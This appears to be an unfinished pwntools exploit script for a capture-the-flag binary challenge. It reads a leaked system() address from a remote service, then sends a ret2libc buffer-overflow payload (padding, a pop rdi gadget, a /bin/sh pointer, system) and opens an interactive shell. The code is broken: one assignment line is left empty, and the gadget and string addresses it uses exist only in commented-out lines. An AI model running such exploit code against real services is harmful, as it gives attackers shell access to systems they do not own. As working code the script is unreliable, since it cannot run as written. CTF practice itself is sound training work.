from pwn import *
from LibcSearcher import *
context(arch='amd64',os='linux',log_level='debug')
p=remote("node4.anna.nssctf.cn",20216)
p.recvuntil("Something>")
p.recvline()
leak_sys_addr=p.recvline().strip()
log.success(leak_sys_addr)
# leak_sys_addr=int(leak_sys_addr,16)
# obj=LibcSearcher('system',leak_sys_addr)
# lib_id=obj.libc_list
# libc_path = f"{os.path.expanduser('~')}/.libc-database/db/{lib_id}.so"
# libc = ELF(libc_path)
# libc_base=leak_sys_addr-obj.dump('system')
# rop=ROP(libc)
# pop_rdi_addr=rop.find_gadget(['pop rdi','ret'])[0]
# log.success(pop_rdi_addr)
# sh_addr=libc_base+obj.dump('str_bin_sh')
libc_sh=
payload=flat([b'a'*(0x80+8),pop_rdi_addr,sh_addr,leak_sys_addr,0])
p.sendline(payload)
p.interactive()
